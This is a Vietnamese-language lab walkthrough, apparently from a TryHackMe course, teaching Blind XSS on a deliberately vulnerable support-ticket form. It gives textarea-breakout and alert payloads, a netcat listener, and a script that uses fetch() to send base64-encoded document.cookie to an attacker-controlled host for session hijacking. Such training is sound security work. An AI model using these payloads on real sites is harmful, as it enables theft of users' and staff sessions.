**Blind XSS (XSS mù)** khá <u>giống với Stored XSS (đã chém gió ở phần trước) ở chỗ payload của mày sẽ được lưu trên trang web chờ người khác vào xem. </u>Nhưng điểm mấu chốt ở đây là: mày hoàn toàn "mù", không thể tự nhìn thấy payload hoạt động hay tự test lên chính mình được.

Thử tưởng tượng một trang web có form liên hệ để gửi tin nhắn cho nhân viên. Nội dung tin nhắn không bị kiểm tra mã độc, thế là kẻ tấn công tha hồ điền bất cứ thứ gì chúng muốn. Những tin nhắn này sau đó được chuyển thành các phiếu hỗ trợ (support tickets) để nhân viên xem trên một cổng thông tin nội bộ (private web portal) vốn được tin tưởng tuyệt đối.

Nếu dùng đúng payload, đoạn JavaScript của kẻ tấn công có thể bí mật gọi ngược (call back) về máy chủ của hắn, tuồn ra ngoài URL của cổng thông tin nội bộ, cookie của nhân viên, và thậm chí là toàn bộ nội dung cái trang mà nhân viên đó đang xem. Từ đó, kẻ tấn công dễ dàng nẫng tay trên phiên đăng nhập (hijack session) và chiếm quyền truy cập vào hệ thống nội bộ.



### Cách kiểm thử Blind XSS

Khi test lỗi Blind XSS, mày phải đảm bảo payload có chứa một lệnh "gọi về" (callback), thường là một HTTP request. Có như vậy mày mới biết được khi nào và liệu đoạn code của mình có thực thi thành công hay không.

Một món đồ chơi rất phổ biến cho trò này là **XSS Hunter Express**. Dù mày hoàn toàn có thể tự viết tool hứng bằng JavaScript, nhưng tool này tiện ở chỗ nó tự động hốt sạch cookie, URL, nội dung trang và ti tỉ thứ khác chụp màn hình về cho mày.


### Thực hành

Truy cập vào trang Acme IT Support tại `[http://10.49.135.246:8080](http://10.49.135.246:8080)`. Bấm vào tab **Customers** trên thanh điều hướng trên cùng rồi chọn link **Signup here** để tạo một tài khoản. Khởi tạo xong thì đăng nhập và bấm vào tab **Support Tickets**, đây chính là bãi đáp để mình săn lỗi.

Bấm nút **Create Ticket** màu xanh lá để tạo một ticket thử xem sao. Điền chữ `test` vào cả phần Tiêu đề (Ticket Subject) lẫn Nội dung (Ticket Contents), rồi bấm nút Create Ticket. Mày sẽ thấy cái ticket vừa tạo nằm chễm chệ trong danh sách kèm theo một dãy số ID, bấm vào đó để mở ra.

Giống như trò Reflected XSS, giờ mình sẽ soi xem cái chữ vừa nhập nó hiện lên trang như thế nào. Mở mã nguồn trang (view page source) lên, mày sẽ thấy đoạn text bị nhốt bên trong một thẻ `<textarea>`.

Giờ quay lại và tạo một ticket khác. Thử xem mình có "vượt ngục" khỏi cái thẻ textarea này được không bằng cách nhập payload sau vào phần Tiêu đề:

```html
</textarea>test

```

Mở lại cái ticket đó và soi source code, ngon lành, thẻ `<textarea>` đã bị đóng ép (escape) thành công.

Thừa thắng xông lên, mình độ thêm payload này xem có chạy được JavaScript để chốt hạ tính năng tạo ticket này dính XSS hay không. Tạo một cái ticket mới với payload:

```html
</textarea><script>alert('THM');</script>

```

Khi view ticket, mày sẽ thấy một hộp thoại alert hiện lên chữ "THM". Ngon! Giờ mình sẽ làm cho nó "ác" hơn để tối đa hóa sát thương. **Vì tính năng này tạo ra ticket hỗ trợ, nên chắc kèo là một lúc nào đó sẽ có nhân viên thật (staff) click vào xem và vô tình kích hoạt đoạn JavaScript của mình trên trình duyệt của họ.**

![[Pasted image 20260919114114.png]]

### Trộm Cookies (Extracting Cookies)

Một trong những món hời nhất khi loot đồ của user khác chính là cookies, thứ giúp mày leo thang đặc quyền bằng cách cướp luôn phiên đăng nhập của họ. Để làm được, payload của mình phải móc được cookie của nạn nhân và tuồn (exfiltrate) về một server do mình làm chủ. Trước tiên, phải dựng một server để đứng hóng dữ liệu gửi về đã.

Mở AttackBox lên, mình sẽ dùng Netcat để giăng bẫy. Nếu muốn hứng ở port `9001`, cứ gõ lệnh:

```bash
nc -nlvp 9001

```

Giải ngố các tham số:

* `-l`: Bật Netcat ở chế độ lắng nghe (listen mode).
* `-p`: Chỉ định cổng (port) muốn mở.
* `-n`: Bỏ qua tra cứu tên miền (DNS) để tăng tốc kết nối.
* `-v`: Chế độ verbose, báo cáo chi tiết mọi diễn biến.

Kết quả sẽ báo đang hóng:

```text
user@machine$ nc -nlvp 9001
Listening on [0.0.0.0] (family 0, port 9001)

```

Giờ server đã sẵn sàng đón lõng thông tin, mình tiến hành lắp đạn (payload):

```html
</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>

```

Mổ xẻ cái payload này ra:

* `</textarea>`: Đóng thẻ text area lại để thoát ra ngoài giao diện HTML.
* `<script>`: Mở đường cho JavaScript chạy.
* `fetch()`: Hàm thực hiện HTTP request để gửi data ngầm đi.
* `URL_OR_IP`: Thay bằng IP của AttackBox hoặc IP VPN của mày.
* `PORT_NUMBER`: Port mày vừa mở trên Netcat (ở đây là 9001).
* `?cookie=`: Tham số URL dùng để chứa dữ liệu.
* `btoa()`: Hàm bọc cookie của nạn nhân dưới dạng mã hóa base64 để truyền qua URL cho khỏi lỗi ký tự.
* `document.cookie`: Cú pháp móc cookie của nạn nhân trên trang Acme IT Support.
* `</script>`: Đóng khối lệnh JavaScript.

Cuối cùng, quất luôn một cái ticket mới bằng payload trên ở ô Tiêu đề (nhớ thay biến `URL_OR_IP:PORT_NUMBER` cho chuẩn bài). Ngồi rung đùi đợi độ một phút để admin ảo vào check ticket, mày sẽ thấy request nhảy tưng tưng trên Netcat, mang theo toàn bộ cookie của nạn nhân.

*(Lưu ý: Nếu dùng máy ảo cá nhân qua VPN thì việc bắt request hay bị tịt ngòi, khuyến khích xài AttackBox cho mượt).*

Húp được chuỗi base64 rồi thì cứ mang lên mấy trang như `[https://www.base64decode.org/](https://www.base64decode.org/)` để giải mã và thưởng thức thành quả thôi.